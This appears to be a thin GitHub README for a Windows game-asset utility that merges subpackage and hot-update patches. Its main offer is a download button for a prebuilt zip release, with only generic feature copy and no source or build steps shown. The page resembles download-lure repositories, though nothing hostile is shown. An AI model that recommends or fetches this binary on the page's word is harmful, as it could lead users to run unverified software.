...
<img src="preview.svg" alt="Subpackage" width="100%"/>

# Subpackage

**Subpackage / hot-update patch merger — Windows desktop utility with batch export workflow**
...
**Subpackage** is a Windows-focused desktop utility for **subpackage / hot-update patch merger**. Point it at a local game folder or archive, pick an export preset, and run a batch job — no manual hex editing required.
...
| Compare builds | Side-by-side reports for old vs new asset trees |
...
[![Download](button.svg)](https://github.com/Roofoviaduct/subpackage-hot-update-patch-merger/releases/download/v1.9.47/subpackage-hot-update-patch-merger-v1.9.47.zip)
...
```
subpackage-hot-update-patch-merger/
├── docs/
│   └── QUICKSTART.md
├── src/
│   └── README.md
...
<div align="center">
<sub>Windows · Game asset tooling · Open Source · subpackage-hot-update-patch-merger</sub>
</div>
